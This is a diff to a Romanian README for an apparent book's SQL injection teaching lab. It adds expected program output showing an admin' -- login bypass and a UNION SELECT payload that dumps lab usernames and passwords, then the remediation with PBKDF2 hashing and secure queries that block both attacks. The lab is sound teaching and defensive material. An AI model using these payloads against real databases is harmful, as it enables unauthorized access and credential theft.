@@ -22,4 +22,45 @@ cd aplicatia-1-sql-injection/vulnerabil
 dotnet run
 ```
 
-Ieșirea așteptată este în carte. Rulați `setup.sql` din nou înainte de a repeta programul (migrarea golește coloana `Parola`).
+Cartea tipărește o ieșire prescurtată; ieșirea completă este mai jos. Rulați `setup.sql` din nou înainte de a repeta programul (migrarea golește coloana `Parola`).
+
+## Rezultatul așteptat
+
+Rulat pe SQL Server 2025; ordinea produselor poate diferi ușor.
+
+```
+=== SQL Injection Lab ===
+
+--- Atac 1: bypass autentificare (aplicația vulnerabilă) ---
+Input: username = admin' --, parola = orice
+
+  SQL generat: SELECT Username, Rol FROM Utilizatori WHERE Username = 'admin' --' AND Parola = 'orice'
+  Autentificat ca: admin (rol: administrator)
+  Rezultat: ACCES PERMIS
+
+--- Atac 2: exfiltrare prin UNION (căutare de produse vulnerabilă) ---
+Input: ' UNION SELECT NULL, Username + ':' + Parola, NULL, NULL FROM Utilizatori --
+
+  SQL generat: SELECT Denumire, Descriere, Pret, Stoc FROM Produse WHERE Denumire LIKE '%' UNION SELECT NULL, Username + ':' + Parola, NULL, NULL FROM Utilizatori --%'
+   | admin:SuperSecretAdmin!
+   | ionescu:Parola123
+   | popescu:Test456!
+   | vasilescu:Secure789
+  Laptop Dell XPS 15 | Laptop ultraperformant
+  Monitor LG 27" | Monitor 4K IPS
+  Mouse wireless | Senzor 25000 DPI
+  Tastatură mecanică | Switch-uri Cherry MX
+
+=== Remediere ===
+Pas A: migrarea parolelor la hash
+  4 parole migrate la PBKDF2; coloana Parola golită.
+
+Pas B: aceleași atacuri contra codului securizat
+[Login securizat] username = admin' --, parola = orice
+  Rezultat: acces refuzat
+[Login securizat] username = admin, parola corectă
+  Autentificat ca: admin (rol: administrator)
+  Rezultat: ACCES PERMIS
+[Căutare securizată] cu payload UNION:
+  0 produse găsite (input tratat ca dată)
+```
